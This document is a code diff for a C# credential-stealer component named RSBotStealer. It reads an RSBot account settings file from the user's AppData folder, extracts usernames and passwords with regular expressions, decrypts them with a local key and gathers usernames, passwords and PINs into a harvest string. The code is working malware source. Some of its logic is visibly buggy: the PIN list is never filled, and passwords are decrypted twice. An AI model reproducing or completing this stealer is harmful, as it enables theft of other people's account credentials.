@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
@@ -13,23 +14,32 @@ namespace sub.Stealers
 {
     internal class RSBotStealer : IStealer
     {
+        private string _name = "RSBotStealer";
+
+        public string Name
+        {
+            get { return _name; }
+            set { _name = value; }
+        }
+
         public string Data { get; set; }
 
         public void Collect()
         {
             IEnumerable<RSBotAccount> accounts = GetLocalAccounts(GetLocalKey());
-            foreach(RSBotAccount acc in accounts)
+            Data += "RSBot Account Stealer\r\n\r\n";
+            foreach (RSBotAccount acc in accounts)
             {
-                Data += "RSBot Account - Name: " + acc.UserName + " Password: " + acc.Password + " Member: " +
-                        acc.IsMember + "Pin: " + acc.Pin + "\r\n";
+                Data += "Username: " + acc.UserName + " Password: " + acc.Password + " Pin: " + acc.Pin + "\r\n";
             }
         }
 
         private const string SettingsFileName = "RSBot_Accounts.ini";
-        private string _settingsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
+
+        private string _settingsFile = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
+
         private const char Delimiter = 'a';
-        private string _userStartCharacter = "[";
-        private string _userEndCharacter = "]";
         private string _passwordHashItem = "password";
         private string _pinItem = "pin";
         private string _rewardItem = "reward";
@@ -46,19 +56,44 @@ namespace sub.Stealers
 
         private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
         {
-            //Needs to parse data out of accountFileData and decrypt password with key
-            
-            List<RSBotAccount> ret = new List<RSBotAccount>();
+            ArrayList usernames = new ArrayList();
+            ArrayList passwords = new ArrayList();
+            ArrayList pins = new ArrayList();
 
-            MatchCollection matches = new Regex(@"\[[a-zA-Z0-9_]{1, 12}\]").Matches(accountFileData);
+            Regex pat = new Regex(@"(?<=\[)[A-Za-z0-9_]{1,12}(?=\])");
+            MatchCollection matches = pat.Matches(accountFileData);
             foreach (Match m in matches)
             {
-                string username = m.Value.Replace("[", "").Replace("]", "");
-                MessageBox.Show(username);
-                //RSBotAccount account = new RSBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
-                //ret.Add(account);
+                usernames.Add(m.Value);
+            }
+            
+            Regex passpat = new Regex(@"(?<=password\=)[A-Za-z0-9_]{1,50}");
+            MatchCollection passmatches = passpat.Matches(accountFileData);
+            foreach (Match m in passmatches)
+            {
+                passwords.Add(m.Value);
             }
 
+            List<RSBotAccount> ret = new List<RSBotAccount>();
+            foreach (string user in usernames)
+            {
+                int idx = usernames.IndexOf(user);
+                const string emp = "None";
+                try
+                {
+                    string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
+                    string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
+                    if (pass != emp)
+                    {
+                        pass = DecryptPassword(pass, key);
+                    }
+                    ret.Add(new RSBotAccount(user, pass, pin));
+                }
+                catch (Exception e)
+                {
+                    MessageBox.Show("Exception: " + e.Message);
+                }
+            }
             return ret.ToArray();
         }
 
@@ -148,22 +183,14 @@ namespace sub.Stealers
     internal class RSBotAccount
     {
         public string UserName;
-        public string PasswordHash;
         public string Password;
         public string Pin;
-        public string Reward;
-        public bool TakeBreaks;
-        public bool IsMember;
 
-        public RSBotAccount(string user, string pass, string pwhash, string pin, string reward, bool breaks, bool member)
+        public RSBotAccount(string user, string pass, string pin)
         {
             UserName = user;
             Password = pass;
-            PasswordHash = pwhash;
             Pin = pin;
-            Reward = reward;
-            TakeBreaks = breaks;
-            IsMember = member;
         }
     }
 }
